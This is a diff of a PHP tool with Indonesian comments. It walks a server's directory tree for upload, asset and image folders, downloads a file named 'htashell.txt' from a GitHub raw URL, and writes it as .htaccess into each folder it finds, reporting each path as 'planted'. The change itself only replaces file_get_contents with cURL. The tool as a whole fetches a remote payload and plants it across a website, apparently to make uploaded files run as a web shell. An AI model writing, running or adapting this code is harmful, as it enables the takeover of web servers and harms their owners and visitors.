@@ -6,33 +6,35 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         exit;
     }
 
-    $dirNames = ['upload', 'uploads', 'asset', 'assets', 'file', 'files', 'image', 'images'];
+    $dirNames = ['upload', 'uploads', 'asset', 'assets', 'file', 'files', 'image', 'images']; 
     $foundDirs = [];
 
     // Cari direktori yang sesuai
-    $rii = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($targetPath));
-    foreach ($rii as $file) {
-        if ($file->isDir()) {
-            $dirname = strtolower($file->getFilename());
-            if (in_array($dirname, $dirNames)) {
+    $rii = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($targetPath)); 
+    foreach ($rii as $file) { 
+        if ($file->isDir()) { 
+            $dirname = strtolower($file->getFilename()); 
+            if (in_array($dirname, $dirNames)) { 
                 $foundDirs[] = $file->getPathname();
             }
         }
     }
 
-    // Download file dan tanam
+    // Download menggunakan cURL
     $url = "https://raw.githubusercontent.com/Lucenox/Essentials/refs/heads/main/htashell.txt";
-    $content = file_get_contents($url);
-
+    $ch = curl_init($url);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    $content = curl_exec($ch);
     if ($content === false) {
         echo "Gagal mengambil file dari URL.";
         exit;
     }
+    curl_close($ch);
 
     $results = [];
 
     foreach ($foundDirs as $dir) {
-        $filePath = rtrim($dir, '/') . '/.htaccess';
+        $filePath = rtrim($dir, '/') . "/.htaccess";
         $result = file_put_contents($filePath, $content);
         if ($result !== false) {
             $results[] = "path -> $filePath berhasil di tanam";
